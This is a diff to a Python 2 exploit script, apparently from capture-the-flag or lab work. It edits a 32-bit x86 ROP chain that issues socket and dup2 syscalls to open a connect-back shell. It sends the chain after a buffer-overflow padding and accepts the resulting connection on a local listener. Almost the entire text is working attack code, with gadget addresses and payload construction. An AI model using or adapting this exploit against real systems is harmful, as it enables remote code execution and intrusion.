@@ -27,18 +27,11 @@ def send_cmd(cmd):
 
     sock.close()
 
-def handler(HOST, PORT):
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((HOST, PORT))
-	s.listen(1)
-	conn, addr = s.accept()
-	print 'Connected by', addr
-	while True:
-	    console(conn)
 
-
-p = Process(target=handler, args=('127.0.0.1', int(sys.argv[2])))
-p.start()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('127.0.0.1', int(sys.argv[2])))
+s.listen(1)
+	
 time.sleep(1)
 
 
@@ -75,6 +68,12 @@ p += pack('<I', 0x00000066) # 0x66
 p += pack('<I', 0x080481e1) # pop ebx ; ret
 p += pack('<I', 0x00000001) # 1
 p += pack('<I', 0x08085cbf) # int 0x80
+# saving eax in memory
+p += pack('<I', 0x0807c83d) # mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret
+
+#p += pack('<I', 0x0808522a) # pop edx ; ret
+#p += pack('<I', 0x08139050) # @ .data3
+#p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
 # [socket,Ptr,16]
 p += pack('<I', 0x0808522a) # pop edx ; ret
 p += pack('<I', 0x08139060) # @ .data
@@ -123,14 +122,16 @@ p += pack('<I', 0x080481e1) # pop ebx ; ret
 p += pack('<I', 0x00000003) # 3
 p += pack('<I', 0x08085cbf) # int 0x80
 # mov ebx, edx ; ret
-#p += pack('<I', 0x080f1016) # pop eax ; ret
-#p += pack('<I', 0x00000000) # @ .data
+p += pack('<I', 0x08082bf0) # mov eax, edi ; pop edi ; ret
+p += pack('<I', 0x00000000) # @ pop
 #p += pack('<I', 0x080aeca3) # add eax, edx ; ret
 #p += pack('<I', 0x080481e1) # pop ebx ; ret
 #p += pack('<I', 0x00000000) # @ .data
-#p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
-p += pack('<I', 0x080481e1) # pop ebx ; ret
-p += pack('<I', 0x00000005) # @ .data
+#p += pack('<I', 0x080c3150) # mov eax, dword ptr [eax + 4] ; ret
+p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
+########p += pack('<I', 0x080dafa7) # nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; ret 4
+#p += pack('<I', 0x080481e1) # pop ebx ; ret
+#p += pack('<I', 0x00000005) # @ .data
 # dup2(sock, 0);
 p += pack('<I', 0x080f1016) # pop eax ; ret
 p += pack('<I', 0x0000003f) # 0x3f
@@ -180,5 +181,8 @@ c = 'w'
 i = 32
 send_cmd(c*i+p)
 
+conn, addr = s.accept()
+print 'Connected by', addr
+console(conn)
 
 # :vim set sw=4 ts=8 sts=8 expandtab:
